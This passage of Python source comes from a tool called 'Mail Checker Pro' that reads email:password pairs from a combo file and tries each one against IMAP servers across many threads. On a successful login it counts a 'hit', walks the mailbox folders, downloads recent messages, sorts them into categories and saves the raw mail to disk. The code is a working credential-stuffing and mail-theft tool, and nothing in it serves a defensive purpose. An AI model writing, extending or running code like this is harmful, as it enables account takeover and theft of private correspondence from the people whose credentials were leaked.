                        self.combo_queue.put(combo)
                print(f"{Fore.GREEN}Loaded {self.total_combos} combos from {self.combo_file_path}{Style.RESET_ALL}")
                break
            except FileNotFoundError:
                easygui.msgbox(f"Error: File not found at {self.combo_file_path}", "File Not Found")
                print(f"{Fore.RED}Error: File not found at {self.combo_file_path}{Style.RESET_ALL}")
            except Exception as e:
                easygui.msgbox(f"Error loading combo file: {e}", "Error")
                print(f"{Fore.RED}Error loading combo file: {e}{Style.RESET_ALL}")
        
    def _get_thread_count(self):
        """Gets the desired number of threads from user input in console."""
        while True:
            try:
                threads_input = input(f"{Fore.CYAN}Enter number of threads (e.g., 5, 10, 20): {Style.RESET_ALL}")
                num_threads = int(threads_input)
                if num_threads <= 0:
                    print(f"{Fore.RED}Please enter a positive number for threads.{Style.RESET_ALL}")
                else:
                    self.threads = num_threads
                    print(f"{Fore.GREEN}Starting with {self.threads} threads.{Style.RESET_ALL}")
                    break
            except ValueError:
                print(f"{Fore.RED}Invalid input. Please enter a whole number.{Style.RESET_ALL}")

    def _update_live_status(self, **kwargs):
        """Updates the current status dictionary for the dashboard."""
        with self.lock:
            self.current_account_status.update(kwargs)

    def _display_dashboard(self):
        """
        Displays the real-time, aesthetically enhanced dashboard in the console.
        Designed to minimize flickering.
        """
        terminal_width = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 120
        
        while self.is_running or not self.combo_queue.empty():
            with self.lock: # Lock to ensure consistent reading of stats
                checked_combos = self.hits + self.bad + self.errors
                elapsed_time = time.time() - self.start_time
                scan_speed = checked_combos / elapsed_time if elapsed_time > 0 else 0
                remaining_combos = self.total_combos - checked_combos
                
                # Handle division by zero for eta_seconds gracefully
                eta_seconds = (remaining_combos / scan_speed) if scan_speed > 0 else float('inf')
                eta_formatted = format_time(eta_seconds) # This will now handle 'inf' correctly

                # Fetch current status for printing
                current_email = self.current_account_status['email']
                current_server = self.current_account_status['imap_server']
                current_port = self.current_account_status['imap_port']
                current_folder = self.current_account_status['folder_scanning']
                current_message = self.current_account_status['message_processing']
                current_overall_status = self.current_account_status['overall_status_msg']

            # Clear screen from cursor to end and move cursor to home position
            sys.stdout.write(f"\033[H\033[J")
            
            output = []
            
            output.append(box_title("MAIL CHECKER PRO - ULTIMATE EDITION", Fore.MAGENTA, terminal_width))
            output.append(f"{Fore.LIGHTBLACK_EX}   Scanning in progress... {Style.RESET_ALL}\n")

            # Overall Status Box
            output.append(f"{Fore.BLUE}{Back.WHITE}{Style.BRIGHT} {' OVERALL SCAN STATUS ':<{terminal_width-2}} {Style.RESET_ALL}")
            output.append(f"{Fore.CYAN}    Accounts Loaded: {Fore.WHITE}{self.total_combos:<10}{Fore.CYAN} | Accounts Checked: {Fore.WHITE}{checked_combos:<10}")
            output.append(f"{Fore.GREEN}    Successful Logins (Hits): {Fore.WHITE}{self.hits:<10}{Fore.RED} | Failed Logins (Bad): {Fore.WHITE}{self.bad:<10}")
            output.append(f"{Fore.YELLOW}    Connection/Other Errors: {Fore.WHITE}{self.errors:<10}{Fore.MAGENTA} | Total Emails Scanned: {Fore.WHITE}{self.total_emails_scanned:<10}")
            output.append(f"{Fore.CYAN}    Total Messages Saved (Hits Found): {Fore.WHITE}{self.total_messages_saved:<10}")
            output.append(f"{Fore.BLUE}    Scan Speed: {Fore.WHITE}{scan_speed:.2f} Acc/Sec{Fore.BLUE} | Estimated Time Remaining: {Fore.WHITE}{eta_formatted}{Style.RESET_ALL}")
            output.append(f"{Fore.BLUE}{Back.WHITE}{'':<{terminal_width-2}}{Style.RESET_ALL}\n")

            # Hits by Category
            output.append(f"{Fore.LIGHTYELLOW_EX}{Back.BLUE}{Style.BRIGHT} {' HITS BY CATEGORY ':<{terminal_width-2}} {Style.RESET_ALL}")
            
            # Sort categories for consistent display (non-"Other" first, then "Other")
            sorted_categories = sorted([item for item in self.category_hits.items() if item[0] != 'Other'], key=lambda item: item[1], reverse=True)
            if 'Other' in self.category_hits:
                sorted_categories.append(('Other', self.category_hits['Other']))

            category_colors = [
                Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
                Fore.LIGHTCYAN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX, Fore.GREEN,
                Fore.RED, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.YELLOW, Fore.WHITE
            ]
            
            max_cat_len = max(len(cat) for cat in CATEGORIES.keys()) if CATEGORIES else 15
            if not sorted_categories: # Handle case with no hits yet
                output.append(f"{Fore.WHITE}    No hits yet...{Style.RESET_ALL}")
            else:
                for i, (category, count) in enumerate(sorted_categories):
                    color = category_colors[i % len(category_colors)]
                    output.append(f"{color}    {category.ljust(max_cat_len)}: {Style.BRIGHT}{count:<5}{Style.RESET_ALL}")
            output.append(f"{Fore.LIGHTYELLOW_EX}{Back.BLUE}{'':<{terminal_width-2}}{Style.RESET_ALL}\n")

            # Current Account Status
            output.append(f"{Fore.WHITE}{Back.RED}{Style.BRIGHT} {' CURRENT ACCOUNT PROCESSING ':<{terminal_width-2}} {Style.RESET_ALL}")
            output.append(f"{Fore.CYAN}    Account: {Fore.WHITE}{current_email}")
            output.append(f"{Fore.CYAN}    IMAP Server: {Fore.WHITE}{current_server}:{current_port}")
            output.append(f"{Fore.CYAN}    Scanning Folder: {Fore.WHITE}{current_folder}")
            output.append(f"{Fore.CYAN}    Overall Status: {Fore.YELLOW}{current_overall_status}")
            output.append(f"{Fore.CYAN}    Processing Message: {Fore.WHITE}{current_message}{Style.RESET_ALL}")
            output.append(f"{Fore.WHITE}{Back.RED}{'':<{terminal_width-2}}{Style.RESET_ALL}")

            # Print all lines to stdout
            sys.stdout.write("\n".join(output) + "\n")
            sys.stdout.flush() # Ensure it's printed immediately

            time.sleep(DASHBOARD_REFRESH_RATE)

    def worker_thread(self):
        """Worker thread to process each email:password combo."""
        while self.is_running or not self.combo_queue.empty():
            combo = None
            try:
                combo = self.combo_queue.get(timeout=0.5) # Short timeout to allow checking self.is_running
                email_address, password = combo.split(':', 1)
                domain = email_address.split('@')[-1].lower() # Ensure domain is lowercase for consistent lookup
                
                self._update_live_status(
                    overall_status_msg="Attempting to connect...", 
                    email=email_address,
                    imap_server="Discovering...",
                    imap_port="N/A",
                    folder_scanning="N/A",
                    message_processing="N/A"
                )

                imap_server, imap_port = find_imap_server(domain)

                if not imap_server:
                    with self.lock:
                        self.errors += 1
                    self.mail_saver._log_error(f"Could not find IMAP server for {email_address} (Domain: {domain})")
                    self._update_live_status(overall_status_msg=f"No IMAP server found for {domain}", email=email_address)
                    self.combo_queue.task_done()
                    continue

                mail = None # Initialize mail to None
                try:
                    self._update_live_status(
                        overall_status_msg="Connecting to IMAP server...",
                        email=email_address,
                        imap_server=imap_server,
                        imap_port=imap_port,
                        folder_scanning="N/A",
                        message_processing="N/A"
                    )
                    mail = imaplib.IMAP4_SSL(imap_server, imap_port)
                    mail.timeout = IMAP_TIMEOUT
                    mail.login(email_address, password)
                    
                    # *** IMPORTANT CHANGE: Count as HIT immediately upon successful login ***
                    with self.lock:
                        self.hits += 1 
                    
                    self._update_live_status(overall_status_msg="Login successful. Discovering folders...", email=email_address)

                    # List all available folders on the IMAP server
                    status, folder_list_raw = mail.list()
                    available_folders = []
                    if status == 'OK':
                        for item in folder_list_raw:
                            try:
                                item_str = item.decode('utf-8', errors='ignore')
                                # Regex to extract folder name, handling quoted names and removing flags like \Noselect
                                # This regex handles (flags) "path/to/folder" and (flags) "folder" formats
                                match = re.search(r'\(([^)]*)\)\s+\"([^\"]+)\"\s+\"([^\"]+)\"', item_str) # for (flags) "separator" "name"
                                if match:
                                    flags = match.group(1).split()
                                    folder_name = match.group(3)
                                    if '\\Noselect' not in flags: # Exclude folders that cannot be selected
                                        available_folders.append(folder_name.strip())
                                else: # Fallback for simpler formats if the above fails
                                    match = re.search(r'\"([^\"]+)\"$', item_str)
                                    if match:
                                        folder_name = match.group(1).strip()
                                        if '\\Noselect' not in item_str: # Simple check for \Noselect flag
                                            available_folders.append(folder_name)
                            except Exception as e:
                                self.mail_saver._log_error(f"Error parsing folder list item for {email_address}: {item} - {e}")
                                continue
                    else:
                        self.mail_saver._log_error(f"Failed to list folders for {email_address}: {status}")
                        available_folders = [] # Clear and then add only known ones that are likely to exist

                    folders_to_check = []
                    # Prioritize exact matches (case-insensitive) from predefined list
                    for preferred_folder in IMAP_FOLDERS_TO_SCAN:
                        # Find the actual case-sensitive name from available_folders
                        found_match = next((f for f in available_folders if f.lower() == preferred_folder.lower()), None)
                        if found_match and found_match not in folders_to_check: # Avoid duplicates
                            folders_to_check.append(found_match)
                    
                    # If after prioritizing, we still have no folders, but there are *any* available folders, take some
                    if not folders_to_check and available_folders: 
                         # Take first few non-noselect folders to attempt
                         folders_to_check = [f for f in available_folders if '\\Noselect' not in f][:5] # Take a few more than just 3
                    
                    # Absolute last resort fallback
                    if not folders_to_check:
                        folders_to_check = ['INBOX'] 
                        self.mail_saver._log_error(f"No specific IMAP folders found/matched for {email_address}. Defaulting to 'INBOX'.")

                    for folder_name_actual in folders_to_check:
                        if not self.is_running: break # Allow graceful exit
                        try:
                            self._update_live_status(
                                overall_status_msg=f"Scanning folder: {folder_name_actual}",
                                email=email_address,
                                folder_scanning=folder_name_actual,
                                message_processing="N/A"
                            )
                            # Use quotes around folder name to handle spaces/special chars in folder names
                            status, _ = mail.select(f'"{folder_name_actual}"', readonly=True) 
                            if status != 'OK':
                                self.mail_saver._log_error(f"Failed to select folder '{folder_name_actual}' for {email_address}: {status}. Skipping.")
                                continue # Skip this folder if selection fails

                            status, msg_ids_data = mail.search(None, 'ALL')
                            if status != 'OK' or not msg_ids_data[0]:
                                continue # No messages or error searching in this specific folder
                            
                            list_of_uids = msg_ids_data[0].split()
                            if not list_of_uids:
                                continue # No messages in this folder

                            # Fetch only the latest MESSAGES_TO_FETCH UIDs
                            latest_uids = list_of_uids[-MESSAGES_TO_FETCH:] 
                            
                            with self.lock:
                                self.total_emails_scanned += len(latest_uids)

                            for num in latest_uids:
                                if not self.is_running: break # Allow graceful exit
                                try:
                                    self._update_live_status(
                                        overall_status_msg=f"Processing message UID: {num.decode()}",
                                        email=email_address,
                                        folder_scanning=folder_name_actual,
                                        message_processing=f"UID: {num.decode()}"
                                    )
                                    status, msg_data = mail.fetch(num, '(RFC822)')
                                    if status != 'OK' or not msg_data[0]:
                                        self.mail_saver._log_error(f"Failed to fetch message {num.decode()} for {email_address}: {status}")
                                        continue
                                    
                                    raw_email = msg_data[0][1]
                                    msg = email.message_from_bytes(raw_email)

                                    sender_raw = msg.get('From', 'Unknown Sender <unknown@example.com>')
                                    sender_match = re.search(r'<([^>]+)>', sender_raw)
                                    sender_email = sender_match.group(1) if sender_match else sender_raw
                                    sender_email = sender_email.lower().strip() # Normalize sender email

                                    subject = decode_str(msg.get('Subject', 'No Subject'))
                                    
                                    # Get body and handle translation for categorization
                                    body_text_for_categorization, original_lang, translated_lang = get_message_body(msg)
                                    
                                    # Categorize based on sender, subject, and translated body
                                    category = get_category_by_sender(sender_email, subject, body_text_for_categorization)
                                    
                                    # Save all messages from successful logins, categorize them.
                                    result_data = {
                                        'account': email_address,
                                        'category': category,
                                        'sender': sender_email,
                                        'subject': subject,
                                        'date': decode_str(msg.get('Date', 'No Date')), # Decode date here
                                        'original_lang': original_lang,
                                        'translated_lang': translated_lang,
                                        'translated_body_snippet': body_text_for_categorization[:SNIPPET_LENGTH], # Use the same translated body
                                        'raw_content': raw_email
                                    }
                                    self.mail_saver.save_message(result_data)
                                    with self.lock:
                                        self.category_hits[category] += 1
                                        self.total_messages_saved += 1
                                    
                                except imaplib.IMAP4.error as e:
                                    self.mail_saver._log_error(f"IMAP error processing message {num.decode()} for {email_address} in {folder_name_actual}: {e}")
                                    self._update_live_status(overall_status_msg=f"IMAP message error for {email_address}", message_processing=str(e))
                                except Exception as e:
                                    self.mail_saver._log_error(f"General error processing message {num.decode()} for {email_address} in {folder_name_actual}: {e}")
                                    self._update_live_status(overall_status_msg=f"Message error for {email_address}", message_processing=str(e))

                        except imaplib.IMAP4.error as e:
                            self.mail_saver._log_error(f"IMAP error selecting/scanning folder '{folder_name_actual}' for {email_address}: {e}")
                            self._update_live_status(overall_status_msg=f"Folder scan error for {email_address}", folder_scanning=folder_name_actual, message_processing=str(e))
                        except Exception as e:
                            self.mail_saver._log_error(f"General error scanning folder '{folder_name_actual}' for {email_address}: {e}")
                            self._update_live_status(overall_status_msg=f"Folder scan error for {email_address}", folder_scanning=folder_name_actual, message_processing=str(e))
                    
                    try:
                        mail.logout() # Logout after processing all folders for the account
                    except Exception as e:
                        self.mail_saver._log_error(f"Error during IMAP logout for {email_address}: {e}")
                    
                except imaplib.IMAP4.error as e:
                    with self.lock:
                        self.bad += 1 # Login failed
                    self.mail_saver._log_error(f"Login failed for {email_address}: {e}")
                    self._update_live_status(overall_status_msg=f"Login failed: {e}", email=email_address)
                except socket.timeout:
                    with self.lock:
                        self.errors += 1
                    self.mail_saver._log_error(f"Connection timeout for {email_address} on {imap_server}:{imap_port}")
                    self._update_live_status(overall_status_msg=f"Connection timeout", email=email_address, imap_server=imap_server)
                except Exception as e:
                    with self.lock:
                        self.errors += 1
                    self.mail_saver._log_error(f"Unhandled error for {email_address}: {e}")
                    self._update_live_status(overall_status_msg=f"Unhandled error: {e}", email=email_address)
                finally:
                    if combo: # Only mark task done if a combo was actually retrieved
                        self.combo_queue.task_done()
            except queue.Empty:
                if not self.is_running and self.combo_queue.empty():
                    break # Exit if no more combos and scanner is stopping
                time.sleep(0.1) # Short sleep if queue is empty to avoid busy-waiting

    def run(self):
        """Main method to run the checker."""
        clear_screen()
        print(box_title("WELCOME TO MAIL CHECKER PRO - ULTIMATE EDITION", Fore.CYAN))
        print(f"{Fore.LIGHTBLACK_EX}   Developed by Gemini AI (Google){Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}   Initializing...{Style.RESET_ALL}\n")

        self._load_combos()
        if self.total_combos == 0:
            print(f"{Fore.RED}No valid combos found in the file. Please check your combo file format (email:password).{Style.RESET_ALL}")
            input("Press Enter to exit.")
            sys.exit(1)

        self._get_thread_count()

        # Start dashboard thread
        dashboard_thread = threading.Thread(target=self._display_dashboard, daemon=True)
        dashboard_thread.start()

        # Start worker threads
        worker_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker_thread, daemon=True)
            worker_threads.append(t)
            t.start()
        
        # Wait for all combos to be processed, then signal workers and dashboard to stop
        self.combo_queue.join() 
        self.is_running = False # Signal worker and dashboard threads to stop
        
        # Give dashboard thread a moment to print final update, but don't block indefinitely
        dashboard_thread.join(timeout=DASHBOARD_REFRESH_RATE * 5 + 1) # Wait a bit longer for final dashboard update
        
        # Finalize reports using current stats
        final_stats = {
            'total_combos': self.total_combos,
            'checked_combos': self.hits + self.bad + self.errors,
            'hits': self.hits,
            'bad': self.bad,
            'errors': self.errors,
            'total_emails_scanned': self.total_emails_scanned,
            'total_messages_saved': self.total_messages_saved,
            'category_hits': self.category_hits,
            'duration': time.time() - self.start_time
        }
        self.mail_saver.finalize_reports(final_stats)

        clear_screen()
        print(box_title("FINAL SCAN REPORT", Fore.GREEN))
        print(f"{Fore.WHITE}Scan finished in {Fore.CYAN}{format_time(final_stats['duration'])}{Style.RESET_ALL}.\n")
        print(f"{Fore.WHITE}Total Accounts Loaded: {Fore.YELLOW}{final_stats['total_combos']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Accounts Checked: {Fore.YELLOW}{final_stats['checked_combos']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Successful Logins (Hits): {Fore.GREEN}{final_stats['hits']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Failed Logins (Bad): {Fore.RED}{final_stats['bad']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Connection/Other Errors: {Fore.MAGENTA}{final_stats['errors']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Emails Scanned Across All Folders: {Fore.BLUE}{final_stats['total_emails_scanned']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Messages Saved (Hits Found): {Fore.CYAN}{final_stats['total_messages_saved']}{Style.RESET_ALL}\n")

        print(f"{Fore.LIGHTYELLOW_EX}Hits Breakdown by Category:{Style.RESET_ALL}")
        category_names = list(CATEGORIES.keys())
        max_cat_len = max(len(cat) for cat in category_names) if category_names else 15
        category_colors = [
            Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
            Fore.LIGHTCYAN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX, Fore.GREEN,
            Fore.RED, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.YELLOW, Fore.WHITE
        ]
        
        # Ensure 'Other' is always at the end for console display
        sorted_categories = sorted([item for item in final_stats['category_hits'].items() if item[0] != 'Other'], key=lambda item: item[1], reverse=True)
        if 'Other' in final_stats['category_hits']:
            sorted_categories.append(('Other', final_stats['category_hits']['Other']))

        for i, (category, count) in enumerate(sorted_categories):
            color = category_colors[i % len(category_colors)]
            print(f"{color}  - {category.ljust(max_cat_len)}: {Style.BRIGHT}{count}{Style.RESET_ALL}")

        print(f"\n{Fore.WHITE}All results, logs, and reports saved in: {Fore.CYAN}{self.save_dir}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Detailed HTML report generated at: {Fore.CYAN}{os.path.join(self.save_dir, 'report_summary.html')}{Style.RESET_ALL}\n")
        
        print(Fore.GREEN + "Thank you for using Mail Checker Pro - Ultimate Edition!" + Style.RESET_ALL)
        input(f"{Fore.CYAN}Press Enter to exit.{Style.RESET_ALL}")

if __name__ == "__main__":
    # This line ensures console output uses UTF-8, important for colorama on Windows
    if platform.system() == "Windows":
        os.system("chcp 65001 > nul") 

    try:
        checker = MailCheckerPro()
        checker.run()
    except KeyboardInterrupt:
        print("\n\n" + Fore.YELLOW + "Scan interrupted by user. Attempting graceful shutdown..." + Style.RESET_ALL)
        if 'checker' in locals() and hasattr(checker, 'is_running'):
            checker.is_running = False
            # Give threads a moment to finish current tasks
            time.sleep(1) 
            print(Fore.YELLOW + "Shutdown complete. Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}An unhandled error occurred: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc() # Print full traceback for debugging unexpected errors
        input(f"{Fore.CYAN}Press Enter to exit.{Style.RESET_ALL}")
        sys.exit(1)
